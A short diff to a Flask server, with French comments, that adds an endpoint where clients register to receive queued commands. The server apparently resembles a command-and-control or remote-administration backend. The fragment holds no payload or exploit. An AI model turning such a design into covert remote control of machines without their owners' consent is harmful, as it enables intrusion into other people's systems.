@@ -14,6 +14,13 @@ def get_command(clientid):
     """
     cmd_data = commands.get(clientid, {"cmd": "", "nonce": -1})
     return jsonify(cmd_data), 200
+    
+@app.route('/register/<clientid>', methods=['POST'])
+def register_client(clientid):
+    """Le client s'enregistre pour apparaître dans la liste des clients"""
+    if clientid not in commands:
+        commands[clientid] = {"cmd": "", "nonce": -1}
+    return jsonify({"message": "Client enregistré"}), 200
 
 @app.route('/getcommand/<clientid>', methods=['POST'])
 def post_command(clientid):
